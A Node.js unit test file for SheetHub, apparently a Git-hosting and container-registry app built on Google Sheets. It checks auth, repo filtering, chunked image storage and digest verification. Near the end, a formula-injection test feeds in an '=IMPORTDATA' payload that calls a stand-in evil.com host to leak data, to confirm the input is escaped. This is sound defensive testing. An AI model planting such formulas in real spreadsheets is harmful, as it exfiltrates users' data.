#!/usr/bin/env node
// Unit test for SheetHub: mocks the Apps Script Sheet layer and runs
// the real Code.gs functions in Node.js.
// Asserts tab initialization, multi-repo seed data, doGet query contract,
// negative auth enforcement, repo filtering, and mutation actions.
//
// Usage: node hack/test.js

const fs = require('fs');
const path = require('path');

const codeText = fs.readFileSync(path.join(__dirname, '..', 'Code.gs'), 'utf8');

// ---- In-memory Google Sheet mock ----
function makeSheet(h) { return { grid: [h.slice()] }; }
function lastNonEmpty(g) {
  for (let r = g.length; r >= 1; r--) {
    if ((g[r - 1] || []).some(c => c !== '' && c != null)) return r;
  }
  return 1;
}

function rangeObj(s, row, col, nr, nc) {
  const o = {
    clearContent() {
      for (let i = 0; i < nr; i++) {
        const r = row - 1 + i;
        if (!s.grid[r]) s.grid[r] = [];
        for (let j = 0; j < nc; j++) s.grid[r][col - 1 + j] = '';
      }
      return o;
    },
    setValues(v) {
      for (let i = 0; i < v.length; i++) {
        const r = row - 1 + i;
        if (!s.grid[r]) s.grid[r] = [];
        for (let j = 0; j < v[i].length; j++) s.grid[r][col - 1 + j] = v[i][j];
      }
      return o;
    },
    setFontWeight() { return o; },
  };
  return o;
}

function api2(s) {
  return {
    getDataRange: () => ({ getValues: () => s.grid.map(r => r.slice()) }),
    getRange: (r, c, nr, nc) => rangeObj(s, r, c, nr, nc),
    getLastRow: () => lastNonEmpty(s.grid),
    appendRow: (a) => { s.grid.push(a.slice()); },
    deleteRows: (st, n) => { s.grid.splice(st - 1, n); },
    setFrozenRows: () => {},
  };
}

const store = {
  Repos:          makeSheet(['name', 'description', 'default_branch', 'visibility', 'stars_count', 'created_at', 'updated_at']),
  Issues:         makeSheet(['id', 'repo', 'number', 'title', 'body', 'author', 'state', 'labels', 'created_at', 'updated_at']),
  MergeRequests:  makeSheet(['id', 'repo', 'number', 'title', 'description', 'author', 'source_branch', 'target_branch', 'state', 'diff_manifest', 'created_at', 'updated_at']),
  Releases:       makeSheet(['id', 'repo', 'tag_name', 'name', 'body', 'author', 'created_at', 'assets']),
  Users:          makeSheet(['username', 'name', 'avatar_url', 'role', 'bio', 'created_at']),
  Comments:       makeSheet(['id', 'target_type', 'target_id', 'author', 'body', 'created_at']),
  Stars:          makeSheet(['repo', 'username', 'starred_at']),
  Files:          makeSheet(['repo', 'path', 'branch', 'content', 'updated_at']),
  Registry:       makeSheet(['id', 'repo', 'name', 'tag', 'digest', 'size_bytes', 'chunk_count', 'chunk_map', 'author', 'created_at', 'updated_at']),
  RegistryChunks: makeSheet(['id', 'digest', 'chunk_index', 'chunk_data', 'size_bytes', 'created_at']),
};

const SpreadsheetApp = {
  getActiveSpreadsheet: () => ({
    getId: () => 'sheethub-test',
    getSheetByName: (n) => (store[n] ? api2(store[n]) : null),
    insertSheet: (n) => {
      store[n] = store[n] || makeSheet([]);
      return api2(store[n]);
    }
  })
};

let uuidN = 0;
const crypto = require('crypto');
const Utilities = {
  getUuid: () => (++uuidN).toString(36).split('').reverse().join('').padEnd(8, '0'),
  DigestAlgorithm: { SHA_256: 'SHA_256' },
  base64Decode: (str) => Array.from(Buffer.from(str, 'base64')),
  computeDigest: (algo, bytes) => {
    const buf = Buffer.from(bytes);
    const hashBuf = crypto.createHash('sha256').update(buf).digest();
    return Array.from(new Int8Array(hashBuf.buffer, hashBuf.byteOffset, hashBuf.length));
  }
};
let lockShouldFail = false;
const LockService = { getScriptLock: () => ({ tryLock() { return !lockShouldFail; }, releaseLock() {} }) };
const ContentService = {
  MimeType: { JSON: 'json' },
  createTextOutput: (t) => ({ _t: t, setMimeType() { return this; } })
};
const HtmlService = {
  XFrameOptionsMode: { ALLOWALL: 'ALLOWALL' },
  createHtmlOutputFromFile: () => ({ setTitle() { return this; }, setXFrameOptionsMode() { return this; } })
};

const api = new Function(
  'SpreadsheetApp', 'Utilities', 'LockService', 'ContentService', 'HtmlService',
  codeText + '\nreturn { setup, readTab, writeTab, doGet, doPost };'
)(SpreadsheetApp, Utilities, LockService, ContentService, HtmlService);

let pass = 0, fail = 0;
const check = (n, c, d) => {
  if (c) {
    pass++;
    console.log('  PASS', n);
  } else {
    fail++;
    console.log('  FAIL', n, '->', JSON.stringify(d));
  }
};

console.log('\n== A: Setup & Seed Multiple Repos ==');
api.setup();

const repos = api.readTab('Repos');
check('Repos tab populated', repos.length >= 2, repos.length);
check('both hello-web and sheeternetes-manifests exist',
  repos.some(r => r.name === 'sncf/hello-web') && repos.some(r => r.name === 'sncf/sheeternetes-manifests'),
  repos.map(r => r.name)
);

const issues = api.readTab('Issues');
check('Issues tab seeded across multiple repos',
  issues.some(i => i.repo === 'sncf/hello-web') && issues.some(i => i.repo === 'sncf/sheeternetes-manifests'),
  issues.map(i => `${i.repo}:#${i.number}`)
);

const mrs = api.readTab('MergeRequests');
check('MergeRequests tab seeded across multiple repos',
  mrs.some(m => m.repo === 'sncf/hello-web') && mrs.some(m => m.repo === 'sncf/sheeternetes-manifests'),
  mrs.map(m => `${m.repo}:!${m.number}`)
);

console.log('\n== B: Negative & Unconditional Auth Enforcement ==');
const unauthGetNoToken = JSON.parse(api.doGet({ parameter: { kind: 'repos' } })._t);
check('doGet without token rejected as unauthorized', unauthGetNoToken.error === 'unauthorized', unauthGetNoToken);

const unauthGetWrongToken = JSON.parse(api.doGet({ parameter: { token: 'wrong_secret', kind: 'repos' } })._t);
check('doGet with wrong token rejected as unauthorized', unauthGetWrongToken.error === 'unauthorized', unauthGetWrongToken);

const unauthPostNoToken = JSON.parse(api.doPost({ postData: { contents: JSON.stringify({ action: 'create_issue' }) } })._t);
check('doPost without token rejected as unauthorized', unauthPostNoToken.error === 'unauthorized', unauthPostNoToken);

const unauthPostWrongToken = JSON.parse(api.doPost({ postData: { contents: JSON.stringify({ token: 'wrong', action: 'create_issue' }) } })._t);
check('doPost with wrong token rejected as unauthorized', unauthPostWrongToken.error === 'unauthorized', unauthPostWrongToken);

console.log('\n== C: doGet SNCF Query Contract & Meaningful Repo Filtering ==');
const validToken = 'CHANGE_ME_super_secret';

const reqAllRepos = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'repos' } })._t);
check('doGet ?kind=repos with token returns items array', Array.isArray(reqAllRepos.items) && reqAllRepos.items.length >= 2, reqAllRepos);

const reqHelloIssues = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'issues', repo: 'sncf/hello-web' } })._t);
check('doGet ?kind=issues&repo=sncf/hello-web returns only hello-web issues',
  reqHelloIssues.items.length >= 2 && reqHelloIssues.items.every(i => i.repo === 'sncf/hello-web'),
  reqHelloIssues.items
);

const reqManifestsIssues = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'issues', repo: 'sncf/sheeternetes-manifests' } })._t);
check('doGet ?kind=issues&repo=sncf/sheeternetes-manifests returns only manifests issues',
  reqManifestsIssues.items.length >= 1 && reqManifestsIssues.items.every(i => i.repo === 'sncf/sheeternetes-manifests'),
  reqManifestsIssues.items
);

const reqCanonicalMrs = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'mergerequests', repo: 'sncf/hello-web' } })._t);
check('doGet with canonical kind=mergerequests works', reqCanonicalMrs.items.length >= 1, reqCanonicalMrs);

console.log('\n== D: doPost Issue Creation & Scoped MR Merge ==');
const newIssueRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'create_issue',
      repo: 'sncf/hello-web',
      title: 'Support health checks',
      body: 'Add /healthz probe to whoami spec',
      author: 'contributor1'
    })
  }
})._t);
check('create_issue returns ok with next number for specific repo', newIssueRes.ok && newIssueRes.issue.number === 3, newIssueRes);

const mergeRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'merge_mr',
      repo: 'sncf/hello-web',
      mr_id: 1
    })
  }
})._t);
check('merge_mr scoped by repo succeeds', mergeRes.ok && mergeRes.mr.state === 'merged' && mergeRes.mr.repo === 'sncf/hello-web', mergeRes);

const updatedFiles = api.readTab('Files');
const helloAppFile = updatedFiles.find(f => f.repo === 'sncf/hello-web' && f.path === 'app.json');
check('merged diff applied to Files tab for hello-web', helloAppFile && JSON.parse(helloAppFile.content).deployments[0].replicas === 5, helloAppFile);

console.log('\n== E: Server Busy / Non-Throwing Lock Handling ==');
lockShouldFail = true;
const lockTimeoutRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'create_issue',
      repo: 'sncf/hello-web',
      title: 'Test Lock'
    })
  }
})._t);
check('lock timeout returns clean JSON error', lockTimeoutRes.error === 'server busy', lockTimeoutRes);
lockShouldFail = false;

console.log('\n== F: Container Registry in Cells (Issue #1) ==');
const seededRegistry = api.readTab('Registry');
check('Registry metadata tab seeded', seededRegistry.length >= 2, seededRegistry.length);
check('whoami and ingress-router container images present',
  seededRegistry.some(r => r.repo === 'sncf/hello-web' && r.name === 'traefik/whoami') &&
  seededRegistry.some(r => r.repo === 'sncf/sheeternetes-manifests' && r.name === 'ingress-router'),
  seededRegistry.map(r => `${r.repo}:${r.name}:${r.tag}`)
);

const seededChunks = api.readTab('RegistryChunks');
check('RegistryChunks tab seeded with chunk rows', seededChunks.length >= 3, seededChunks.length);
check('All seeded chunk characters are <= 32,767 (Excel cell limit)',
  seededChunks.every(c => String(c.chunk_data).length <= 32767),
  seededChunks.map(c => String(c.chunk_data).length)
);

// Query registry with repo filtering
const reqHelloRegistry = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'registry', repo: 'sncf/hello-web' } })._t);
check('doGet ?kind=registry&repo=sncf/hello-web filters by repo',
  reqHelloRegistry.items.length >= 1 && reqHelloRegistry.items.every(r => r.repo === 'sncf/hello-web'),
  reqHelloRegistry.items
);

// Push large image layer (>70,000 base64 chars) that requires automatic cell range sharding
const rawPayload = Buffer.from('SheetHub container layer test binary data payload '.repeat(2000), 'utf8');
const testDigest = 'sha256:' + crypto.createHash('sha256').update(rawPayload).digest('hex');
const testBase64 = rawPayload.toString('base64');

check('Test payload exceeds single cell capacity (len > 32767)', testBase64.length > 32767, testBase64.length);

// Server-side SHA-256 verification: negative test for mismatched digest
const badDigestRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'tampered-layer',
      tag: 'v1.0.0',
      digest: 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
      content: testBase64,
      author: 'prateeekbuilds'
    })
  }
})._t);
check('push_image rejects tampered / mismatched client digest', badDigestRes.error && badDigestRes.error.includes('digest mismatch'), badDigestRes);

// Push image with valid digest and verify server-side verification
const pushRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'web-service',
      tag: 'v1.2.3',
      digest: testDigest,
      content: testBase64,
      author: 'prateeekbuilds'
    })
  }
})._t);

check('push_image succeeds with sharded chunk count >= 2', pushRes.ok && pushRes.chunk_count >= 2, pushRes);
check('push_image metadata has chunk_map JSON', pushRes.image && Array.isArray(JSON.parse(pushRes.image.chunk_map)), pushRes.image?.chunk_map);
check('push_image computed authoritative digest matches testDigest', pushRes.image && pushRes.image.digest === testDigest, pushRes.image?.digest);

const chunksAfterPush = api.readTab('RegistryChunks');
const pushedImageChunks = chunksAfterPush.filter(c => c.digest === testDigest);
check('All sharded chunks strictly respect <= 32,767 char Excel cell cap',
  pushedImageChunks.length >= 2 && pushedImageChunks.every(c => String(c.chunk_data).length <= 32767),
  pushedImageChunks.map(c => String(c.chunk_data).length)
);

// Server-side automatic SHA-256 computation when client supplies no digest
const autoDigestPayload = Buffer.from('Auto digest computation test layer', 'utf8');
const autoExpectedDigest = 'sha256:' + crypto.createHash('sha256').update(autoDigestPayload).digest('hex');
const autoPushRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'auto-digest-img',
      tag: 'latest',
      content: autoDigestPayload.toString('base64'),
      author: 'prateeekbuilds'
    })
  }
})._t);
check('push_image without digest computes authoritative SHA-256 server-side', autoPushRes.ok && autoPushRes.image.digest === autoExpectedDigest, autoPushRes);

// Orphaned chunk cleanup test: re-push same repo:name:tag with new content/digest
const newVersionPayload = Buffer.from('Updated layer v2 content', 'utf8');
const newVersionDigest = 'sha256:' + crypto.createHash('sha256').update(newVersionPayload).digest('hex');
const rePushRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'auto-digest-img',
      tag: 'latest',
      content: newVersionPayload.toString('base64'),
      author: 'prateeekbuilds'
    })
  }
})._t);
check('re-pushing updated image returns ok with new digest', rePushRes.ok && rePushRes.image.digest === newVersionDigest, rePushRes);
const chunksAfterRePush = api.readTab('RegistryChunks');
check('orphaned chunks from old digest cleaned up from RegistryChunks tab', !chunksAfterRePush.some(c => c.digest === autoExpectedDigest), chunksAfterRePush.length);

// Reject push with oversized chunk (> 32767 chars)
const oversizedRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'oversized-test',
      tag: 'latest',
      chunks: ['A'.repeat(35000)]
    })
  }
})._t);
check('push_image rejects chunks exceeding 32,767 cell limit', oversizedRes.error && oversizedRes.error.includes('32767'), oversizedRes);

// Pull image and verify full reassembly + checksum match
const pullRes = JSON.parse(api.doGet({
  parameter: {
    token: validToken,
    kind: 'registry_pull',
    repo: 'sncf/hello-web',
    name: 'web-service',
    tag: 'v1.2.3'
  }
})._t);

check('registry_pull returns ok with image metadata and chunks', pullRes.ok && pullRes.image && Array.isArray(pullRes.chunks), pullRes.ok);

// Reassemble base64 from all chunks in order
const reassembledBase64 = pullRes.chunks
  .sort((a, b) => Number(a.chunk_index) - Number(b.chunk_index))
  .map(c => c.chunk_data)
  .join('');

const reassembledBinary = Buffer.from(reassembledBase64, 'base64');
const reassembledDigest = 'sha256:' + crypto.createHash('sha256').update(reassembledBinary).digest('hex');

check('Reassembled base64 matches original payload exactly', reassembledBase64 === testBase64, {
  origLen: testBase64.length,
  reassembledLen: reassembledBase64.length
});
check('Reassembled SHA-256 digest matches metadata digest', reassembledDigest === testDigest, {
  expected: testDigest,
  actual: reassembledDigest
});

// Pull seeded images and verify their digests and reassembly
const pullWhoami = JSON.parse(api.doGet({
  parameter: { token: validToken, kind: 'registry_pull', repo: 'sncf/hello-web', name: 'traefik/whoami', tag: 'latest' }
})._t);
check('Seeded whoami image pulls successfully', pullWhoami.ok && pullWhoami.chunks.length === 2, pullWhoami);
const reassembledWhoami = pullWhoami.chunks
  .sort((a, b) => Number(a.chunk_index) - Number(b.chunk_index))
  .map(c => c.chunk_data).join('');
const reassembledWhoamiBuf = Buffer.from(reassembledWhoami, 'base64');
const whoamiHash = 'sha256:' + crypto.createHash('sha256').update(reassembledWhoamiBuf).digest('hex');
check('Seeded whoami reassembled digest matches metadata digest exactly', whoamiHash === pullWhoami.image.digest, { expected: pullWhoami.image?.digest, actual: whoamiHash });

const pullIngress = JSON.parse(api.doGet({
  parameter: { token: validToken, kind: 'registry_pull', repo: 'sncf/sheeternetes-manifests', name: 'ingress-router', tag: 'v2.10' }
})._t);
check('Seeded ingress-router image pulls successfully', pullIngress.ok && pullIngress.chunks.length === 1, pullIngress);
const reassembledIngress = pullIngress.chunks[0].chunk_data;
const reassembledIngressBuf = Buffer.from(reassembledIngress, 'base64');
const ingressHash = 'sha256:' + crypto.createHash('sha256').update(reassembledIngressBuf).digest('hex');
check('Seeded ingress-router reassembled digest matches metadata digest exactly', ingressHash === pullIngress.image.digest, { expected: pullIngress.image?.digest, actual: ingressHash });

// Formula injection protection test
const formulaIssueRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'create_issue',
      repo: 'sncf/hello-web',
      title: '=IMPORTDATA("http://evil.com/leak")',
      author: '+12345evil',
      body: '@SUM(1,2)'
    })
  }
})._t);
check('Formula injection inputs accepted and safely handled', formulaIssueRes.ok && formulaIssueRes.issue, formulaIssueRes);
const rawStoreRows = store['Issues'].grid;
const injectedRow = rawStoreRows.find(r => r && r.some(cell => String(cell).includes('IMPORTDATA')));
check('Formula injection string has single-quote prefix in raw sheet cells', injectedRow && injectedRow.some(cell => cell === '\'=IMPORTDATA("http://evil.com/leak")'), injectedRow);
const issuesReadBack = api.readTab('Issues');
const unescapedIssue = issuesReadBack.find(i => i.title === '=IMPORTDATA("http://evil.com/leak")');
check('readTab seamlessly unescapes formula strings back to clean text', !!unescapedIssue, unescapedIssue);

// Negative test: Reject undecodable base64 without fabricating sha256:unknown
const undecodableRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'broken-b64',
      tag: 'latest',
      chunks: ['!!!NotValidBase64@@@']
    })
  }
})._t);
check('push_image rejects invalid/undecodable base64 without fabricating digest', undecodableRes.error && !undecodableRes.ok, undecodableRes);

// Negative test: Reject empty / zero-byte layer push
const emptyPushRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'empty-layer',
      tag: 'latest',
      chunks: ['']
    })
  }
})._t);
check('push_image rejects empty / zero-byte layer', emptyPushRes.error && emptyPushRes.error.includes('empty'), emptyPushRes);

// Negative test: Reject payload exceeding max chunk count cap
const tooManyChunks = Array.from({ length: 501 }, (_, i) => 'AAAA');
const capExceededRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'huge-layer',
      tag: 'latest',
      chunks: tooManyChunks
    })
  }
})._t);
check('push_image rejects uploads exceeding max chunk count cap', capExceededRes.error && capExceededRes.error.includes('maximum allowed'), capExceededRes);

// Shared digest delete guard test: two image tags sharing a digest
const sharedPayload = Buffer.from('Shared layer chunk content across tags', 'utf8');
const sharedB64 = sharedPayload.toString('base64');
const sharedDigest = 'sha256:' + crypto.createHash('sha256').update(sharedPayload).digest('hex');

api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken, action: 'push_image', repo: 'sncf/hello-web',
      name: 'shared-svc', tag: 'v1.0.0', content: sharedB64, digest: sharedDigest
    })
  }
});
api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken, action: 'push_image', repo: 'sncf/hello-web',
      name: 'shared-svc', tag: 'v1-alias', content: sharedB64, digest: sharedDigest
    })
  }
});

// Delete v1.0.0
const delV1Res = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken, action: 'delete_image', repo: 'sncf/hello-web',
      image: 'shared-svc:v1.0.0'
    })
  }
})._t);
check('delete_image v1.0.0 returns ok', delV1Res.ok && delV1Res.deleted, delV1Res);

// Verify chunks are STILL present because v1-alias uses the same digest
const chunksAfterFirstDelete = api.readTab('RegistryChunks');
check('shared chunks preserved in RegistryChunks when alias still exists', chunksAfterFirstDelete.some(c => c.digest === sharedDigest), chunksAfterFirstDelete.length);

// Delete v1-alias
api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken, action: 'delete_image', repo: 'sncf/hello-web',
      image: 'shared-svc:v1-alias'
    })
  }
});
const chunksAfterSecondDelete = api.readTab('RegistryChunks');
check('shared chunks cleaned up after last image using digest is deleted', !chunksAfterSecondDelete.some(c => c.digest === sharedDigest), chunksAfterSecondDelete.length);

// Delete test web-service image and ensure cleanup
const deleteRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'delete_image',
      repo: 'sncf/hello-web',
      image: 'web-service:v1.2.3'
    })
  }
})._t);

check('delete_image returns ok', deleteRes.ok && deleteRes.deleted, deleteRes);
const registryAfterDelete = api.readTab('Registry');
check('image deleted from Registry metadata tab', !registryAfterDelete.some(r => r.digest === testDigest), registryAfterDelete.length);
const chunksAfterDelete = api.readTab('RegistryChunks');
check('associated chunks deleted from RegistryChunks tab', !chunksAfterDelete.some(c => c.digest === testDigest), chunksAfterDelete.length);

// ---- Regression: index.html seed digests must match the hash of their own seed chunks ----
// (guards against UI/backend digest drift, which silently breaks downloadLayer's integrity check)
console.log('\n== I: UI seed digest integrity ==');
const ui = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
const grab = (re) => (ui.match(re) || [])[1];
const uiWhoami = grab(/whoamiDigest\s*=\s*'([^']+)'/);
const uiIngress = grab(/ingressDigest\s*=\s*'([^']+)'/);
const uiC1 = grab(/sampleChunk1\s*=\s*'([^']+)'/);
const uiC2 = grab(/sampleChunk2\s*=\s*'([^']+)'/);
const sha = (b64) => 'sha256:' + crypto.createHash('sha256').update(Buffer.from(b64, 'base64')).digest('hex');
check('index.html whoami digest matches sha256(decode(chunk1+chunk2))', uiWhoami === sha(uiC1 + uiC2), { uiWhoami, expected: sha(uiC1 + uiC2) });
check('index.html ingress digest matches sha256(decode(chunk1))', uiIngress === sha(uiC1), { uiIngress, expected: sha(uiC1) });

console.log(`\n==== SheetHub Test Results: ${pass} passed, ${fail} failed ====`);
process.exit(fail ? 1 : 0);

